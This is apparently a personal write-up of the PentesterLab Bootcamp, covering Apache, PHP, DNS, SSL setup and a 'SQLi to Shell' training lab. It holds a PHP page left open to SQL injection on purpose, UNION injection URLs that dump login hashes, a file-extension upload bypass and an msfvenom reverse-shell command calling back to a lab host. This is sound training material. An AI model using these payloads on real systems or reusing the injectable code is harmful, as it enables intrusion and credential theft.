# PentesterLab Bootcamp
## 1 - Linux and scripting
I'm not going too deep with this section since it's quite easy, I choose Debian as OS and Python as a scripting language (since I have a lot of experience with it) 

![](debian1.png) 

Really beautiful!

## 2 - HTTP
I easly installed apache on my system using:
~~~
sudo apt-get install apache2
~~~
...and let's see how the default Apache page looks like:

![](debian2.png) 

The next task involes changing the host file in order to access my local machine using the name *vulnerable*.

The host file is located at:
~~~
/etc/hosts
~~~
I just added this line in order to make it work:
~~~
sudo nano /etc/hosts
127.0.0.1 vulnerable
~~~

I used an easy python script to retreive the apache default page:
~~~python
import requests
r = requests.get("http://vulnerable")
print r.text
~~~

Using sockets:
~~~python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("vulnerable",80))
s.send("GET / HTTP/1.0\r\n\r\n")
while True:
	resp = s.recv(1024)
	if resp == '':
		break
	print resp
s.close()
~~~

I'm skipping the Burp part since I do it every single day at work :) 

## 3 - PHP and DNS marted√¨, 09. maggio 2017 04:21 

#### Virtual hosting
I'm going to write e few lines on virtual hosting because I have no prior experience with it and it may be useful in the future.
Basically virtual hosting is a technology that allows to have multiple domain names on a single physical server (and of course treat them differently)
This may be useful for shared hosting, since is't less expensive tham the dedicated couterpart.
There are two *principal* kind of virtual hosting:

- **Name based**: Different domain names point to the same IP.
When the client makes a requests it must use the *Host* header, so the webserver acts accordingly.
One of the biggest problem of using Name Based virtual hosting is the use of **SSL**.
The problem exists because the webserver must know which certificate present to the client **before** data are sent, **but** the only thing that discriminate two virtual hosted site is the *Host* header wich is part of the data!

- **IP Based**: Different names point to different IPs, but they all belong to the physical server (es multiple network interfaces)


Both type of virtual hosting have pro and cons, and they can be combined together.

#### PHP Basics
The task is to create a php page that echoes the GET parameter, I used htmlspecialchars() function to avoid XSS (spoiler :) )
~~~php
<?php
echo "Hello: " . htmlspecialchars($_GET['name']);
?>
~~~

The second task was to build a DB using MySQL and retreive some information using PHP.
For the DB I used the following code ( I admint I had to read again some documentation on SQL)
~~~SQL
CREATE DATABASE test;
USE test;
CREATE TABLE articolo(id int, descrizione VARCHAR(200));
INSERT INTO articolo VALUES (0, "A great book");
INSERT INTO articolo VALUES (1, "A great movie");
~~~
The PHP code I used to accomplish the task is the following (SQL Injection left for later fun):
~~~PHP
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "test";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$sql = "SELECT * FROM articolo WHERE id=" .  $_GET['id'] . " LIMIT 1" ;
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
        echo $row['descrizione'];
    }
} else {
    echo "0 results";
}
$conn->close();
?>
~~~
#### DNS and WHOIS
The task is quite easy, find every info about PentesterLab using dig, nslookup and whois, let's begin.
~~~bash
nslookup pentesterlab.com
Server:		127.0.1.1
Address:	127.0.1.1#53

Non-authoritative answer:
Name:	pentesterlab.com
Address: 54.172.242.130
~~~
As we can see, the domain pentesterlab.com points to 54.172.242.130, let's proceed with some more detailed informations like MX and NS servers:
~~~bash
$ dig mx pentesterlab.com

; <<>> DiG 9.10.3-P4-Ubuntu <<>> mx pentesterlab.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 60950
;; flags: qr rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1280
;; QUESTION SECTION:
;pentesterlab.com.		IN	MX

;; ANSWER SECTION:
pentesterlab.com.	28800	IN	MX	5 ASPMX5.GOOGLEMAIL.COM.
pentesterlab.com.	28800	IN	MX	5 ASPMX4.GOOGLEMAIL.COM.
pentesterlab.com.	28800	IN	MX	5 ASPMX3.GOOGLEMAIL.COM.
pentesterlab.com.	28800	IN	MX	3 ALT1.ASPMX.L.GOOGLE.COM.
pentesterlab.com.	28800	IN	MX	1 ASPMX.L.GOOGLE.COM.
pentesterlab.com.	28800	IN	MX	5 ASPMX2.GOOGLEMAIL.COM.
pentesterlab.com.	28800	IN	MX	3 ALT2.ASPMX.L.GOOGLE.COM.

;; Query time: 64 msec
;; SERVER: 127.0.1.1#53(127.0.1.1)
;; WHEN: Wed May 10 20:02:51 CEST 2017
;; MSG SIZE  rcvd: 224
~~~
~~~bash
$ dig ns pentesterlab.com

; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns pentesterlab.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 43236
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1280
;; QUESTION SECTION:
;pentesterlab.com.		IN	NS

;; ANSWER SECTION:
pentesterlab.com.	10565	IN	NS	a.dns.gandi.net.
pentesterlab.com.	10565	IN	NS	c.dns.gandi.net.
pentesterlab.com.	10565	IN	NS	b.dns.gandi.net.

;; Query time: 39 msec
;; SERVER: 127.0.1.1#53(127.0.1.1)
;; WHEN: Wed May 10 20:04:56 CEST 2017
;; MSG SIZE  rcvd: 106
~~~
Shall we try zone transfer on the NS servers?

~~~bash
$ for ns in $(host -t ns pentesterlab.com | cut -d " " -f4); do dig @$ns axfr pentesterlab.com; done

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @c.dns.gandi.net. axfr pentesterlab.com
; (2 servers found)
;; global options: +cmd
; Transfer failed.

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @b.dns.gandi.net. axfr pentesterlab.com
; (2 servers found)
;; global options: +cmd
; Transfer failed.

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @a.dns.gandi.net. axfr pentesterlab.com
; (2 servers found)
;; global options: +cmd
; Transfer failed.

~~~
Well, it was worth a try.
The WHOIS output:
~~~bash
Registrars.
Domain Name: pentesterlab.com
Registry Domain ID: 1671658410_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.gandi.net
Registrar URL: http://www.gandi.net
Updated Date: 2016-07-28T07:55:39Z
Creation Date: 2011-08-12T07:45:49Z
Registrar Registration Expiration Date: 2017-08-12T07:45:49Z
Registrar: GANDI SAS
Registrar IANA ID: 81
Registrar Abuse Contact Email: abuse@support.gandi.net
Registrar Abuse Contact Phone: +33.170377661
Reseller: 
Domain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
Domain Status: 
Domain Status: 
Domain Status: 
Domain Status: 
Registry Registrant ID: 
Registrant Name: Louis Nyffenegger
Registrant Organization: 
Registrant Street: Obfuscated whois Gandi-63-65 boulevard Massena
Registrant City: Obfuscated whois Gandi-Paris
Registrant State/Province: Paris
Registrant Postal Code: 75013
Registrant Country: FR
Registrant Phone: +33.170377666
Registrant Phone Ext:
Registrant Fax: +33.143730576
Registrant Fax Ext:
Registrant Email: b0d84af659744f316b26d30afbc5330e-703694@contact.gandi.net
Registry Admin ID: 
Admin Name: Louis Nyffenegger
Admin Organization: 
Admin Street: Obfuscated whois Gandi-63-65 boulevard Massena
Admin City: Obfuscated whois Gandi-Paris
Admin State/Province: Paris
Admin Postal Code: 75013
Admin Country: FR
Admin Phone: +33.170377666
Admin Phone Ext:
Admin Fax: +33.143730576
Admin Fax Ext:
Admin Email: b0d84af659744f316b26d30afbc5330e-703694@contact.gandi.net
Registry Tech ID: 
Tech Name: Louis Nyffenegger
Tech Organization: 
Tech Street: Obfuscated whois Gandi-63-65 boulevard Massena
Tech City: Obfuscated whois Gandi-Paris
Tech State/Province: Paris
Tech Postal Code: 75013
Tech Country: FR
Tech Phone: +33.170377666
Tech Phone Ext:
Tech Fax: +33.143730576
Tech Fax Ext:
Tech Email: b0d84af659744f316b26d30afbc5330e-703694@contact.gandi.net
Name Server: A.DNS.GANDI.NET
Name Server: B.DNS.GANDI.NET
Name Server: C.DNS.GANDI.NET
Name Server: 
Name Server: 
Name Server: 
Name Server: 
Name Server: 
Name Server: 
Name Server: 
DNSSEC: Unsigned
~~~

### SSL and TLS sabato, 13. maggio 2017 11:15 


For enabling SSL in my apache installation I had to follow DigitalOcean's tutorial:
https://www.digitalocean.com/community/tutorials/how-to-create-a-ssl-certificate-on-apache-for-ubuntu-14-04

Not an hard task to accomplish, the steps I followed are the listed below:

- I enabled the SSL module and restarted apache:
~~~
sudo a2enmod ssl
sudo service apache2 restart
~~~
- I created a self-signed certificate using openssl:
~~~
sudo mkdir /etc/apache2/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt
~~~
After I entered the basic certificate infromation, I edited the default-ssl.conf file located at /etc/apache2/sites-avaiable
I changed the following two lines:
~~~
SSLCertificateFile /etc/apache2/ssl/apache.crt
SSLCertificateKeyFile /etc/apache2/ssl/apache.key
~~~
- Finally I enabled the virtual host  by typing:
~~~
sudo a2ensite default-ssl.conf
sudo service apache2 restart
~~~

And every thing works fine!

### From SQLi to Shell
I'm going to write a short review of The SQLi to shell ISO on pentesterlab, I'm not going to follow the course guide so some steps may be different.
The first step after mapping the application is to try to inject some SQL commands, it's not my methodology but this is a small guided exercise so it may be an overkill to follow every step.
It's clear that we have a SQL injection:

![](sqli1.png) 

Let's try UNION injection to find the exact number of columns in the query:
~~~
http://172.28.128.3/cat.php?id=2%20UNION%20SELECT%20null;%20--%20-
~~~
The response:

~~~
The used SELECT statements have a different number of columns 
~~~

This means that we have to try a different number of columns in the injection.

Using  4 NULL values:
~~~
http://172.28.128.3/cat.php?id=2%20UNION%20SELECT%20null,null,null,null;%20--%20-
~~~
We have a good response! Now we can try to inject more meaningful queries such as @@version, and database()!
The query:
~~~
http://172.28.128.3/cat.php?id=2%20UNION%20SELECT%201,@@version,1,null;%20--%20-
~~~
Returned the exact version of the db: 
~~~
5.1.63-0+squeeze1
~~~
I extracted all the tables name:
~~~
http://172.28.128.3/cat.php?id=2%20UNION%20SELECT%201,%20table_name,1,1%20FROM%20information_schema.tables;%20--%20-
~~~
Looking for a low hanging fruit, I decided to dump the content of the table *users*.
I listed all the columns using:
~~~
http://172.28.128.3/cat.php?id=2 UNION SELECT 1,column_name,1,1 FROM information_schema.columns; -- -
~~~
and the columns I was looking for are *login* and *password*:
~~~
http://172.28.128.3/cat.php?id=2 UNION SELECT 1,login,1,1 FROM users; -- -
http://172.28.128.3/cat.php?id=2 UNION SELECT 1,password,1,1 FROM users; -- -
~~~

The result is this:
> admin:8efe310f9ab3efeae8d410a8e0166eb2

Just googling the password hash, gave me the solution:
> P4ssw0rd

Shall we log into the admin panel?
The admin panel allows us to upload new pictures, I tried to upload a php file but the server blocked me.
I simply bypassed the filter renaming my shell with the extension **PhP** instead of **php**.
I generated a shell using **msfvenom** and uploaded it:
~~~
sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.28.128.1 LPORT=4444 -f raw -o exploit.PhP
~~~

![](expl1.png) 
